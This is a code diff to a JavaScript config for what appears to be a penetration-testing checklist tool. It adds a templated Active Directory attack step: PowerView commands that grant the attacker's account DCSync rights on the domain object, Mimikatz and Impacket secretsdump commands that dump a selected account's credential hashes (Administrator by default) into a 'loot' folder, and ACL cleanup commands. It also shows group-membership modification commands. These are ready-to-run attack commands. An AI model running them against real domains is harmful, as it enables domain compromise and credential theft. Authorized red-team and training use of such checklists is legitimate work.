@@ -14,6 +14,7 @@ export const DEFAULT_VARIABLES = {
   user: "",
   memberUser: "",
   targetGroup: "",
+  dcsyncUser: "Administrator",
   password: "",
   gppCpassword: "",
   hash: "",
@@ -31,7 +32,7 @@ export const VARIABLE_GROUPS = [
   { label: "Workspace", keys: ["workspaceRoot"] },
   { label: "Operator", keys: ["lhost", "lport", "interface"] },
   { label: "Target", keys: ["targetName", "rhost", "rport", "uport", "subnet", "userFlagName", "rootFlagName"] },
-  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "password", "gppCpassword", "hash"] },
+  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "dcsyncUser", "password", "gppCpassword", "hash"] },
   { label: "Resources", keys: ["smbShare", "smbDirectory", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
 ];
 
@@ -458,6 +459,22 @@ export const CHECKLIST = [
           { label: "Verify selected member", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'; grep -F \"member: $member_dn\" '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'" },
           { label: "Rollback: remove member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; printf 'dn: %s\\nchangetype: modify\\ndelete: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
           { label: "Windows ADSI: add member", value: "$Group = ([adsisearcher]'(&(objectClass=group)(sAMAccountName={{targetGroup}}))').FindOne().GetDirectoryEntry(); $Member = ([adsisearcher]'(&(objectClass=user)(sAMAccountName={{memberUser}}))').FindOne().GetDirectoryEntry(); [void]$Group.Properties['member'].Add($Member.distinguishedName.Value); $Group.CommitChanges(); $Group.RefreshCache(); $Group.Properties['member']" },
+        ],
+      },
+      {
+        id: "ad-domain-writedacl",
+        title: "Exercise WriteDACL over the domain object",
+        detail: "Use this only after confirming WriteDacl or equivalent control over the domain object. The acting Username is also the explicit PrincipalIdentity receiving DCSync rights. Capture its existing ACEs, grant only DCSync, retrieve only the selected DCSync user, then remove the same ACEs and verify cleanup. The PowerView commands expect PowerView to already be loaded in the Windows PowerShell session.",
+        commands: [
+          { label: "PowerView: confirm required functions", value: "Get-Command Get-DomainUser,Get-DomainObjectAcl,Add-DomainObjectAcl,Remove-DomainObjectAcl | Select-Object Name,CommandType" },
+          { label: "PowerView: capture current domain ACEs", value: "$SecPassword = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $SecPassword); $PrincipalSid = Get-DomainUser -Identity '{{user}}' -Domain '{{domain}}' -Credential $Cred | Select-Object -ExpandProperty objectSid; Get-DomainObjectAcl -Identity '{{domain}}' -Domain '{{domain}}' -ResolveGUIDs -Credential $Cred | Where-Object { $_.SecurityIdentifier -eq $PrincipalSid } | Format-List SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceQualifier,IsInherited | Tee-Object -FilePath '.\\dcsync-acl-before.txt'" },
+          { label: "PowerView: grant self DCSync", value: "$SecPassword = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $SecPassword); Add-DomainObjectAcl -Credential $Cred -TargetIdentity '{{domain}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{user}}' -PrincipalDomain '{{domain}}' -Rights DCSync -Verbose" },
+          { label: "PowerView: verify DCSync ACEs", value: "$SecPassword = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $SecPassword); $PrincipalSid = Get-DomainUser -Identity '{{user}}' -Domain '{{domain}}' -Credential $Cred | Select-Object -ExpandProperty objectSid; $Aces = Get-DomainObjectAcl -Identity '{{domain}}' -Domain '{{domain}}' -ResolveGUIDs -Credential $Cred | Where-Object { $_.SecurityIdentifier -eq $PrincipalSid -and $_.ObjectAceType -match 'DS-Replication-Get-Changes' }; $Aces | Format-Table SecurityIdentifier,ObjectAceType,ActiveDirectoryRights,AceQualifier -AutoSize; if (-not $Aces) { throw 'DCSync ACEs were not found' }" },
+          { label: "Mimikatz: DCSync selected account", value: "lsadump::dcsync /domain:{{domain}} /user:{{dcsyncUser}}" },
+          { label: "Impacket: DCSync selected account with password", value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'" },
+          { label: "Impacket: DCSync selected account with NT hash", value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'" },
+          { label: "PowerView cleanup: remove DCSync", value: "$SecPassword = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $SecPassword); Remove-DomainObjectAcl -Credential $Cred -TargetIdentity '{{domain}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{user}}' -PrincipalDomain '{{domain}}' -Rights DCSync -Verbose" },
+          { label: "PowerView cleanup: verify removal", value: "$SecPassword = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $SecPassword); $PrincipalSid = Get-DomainUser -Identity '{{user}}' -Domain '{{domain}}' -Credential $Cred | Select-Object -ExpandProperty objectSid; $Aces = Get-DomainObjectAcl -Identity '{{domain}}' -Domain '{{domain}}' -ResolveGUIDs -Credential $Cred | Where-Object { $_.SecurityIdentifier -eq $PrincipalSid -and $_.ObjectAceType -match 'DS-Replication-Get-Changes' }; if ($Aces) { $Aces | Format-Table -AutoSize; throw 'DCSync ACE cleanup is incomplete' } else { 'DCSync ACE cleanup confirmed' }" },
         ],
       },
       {
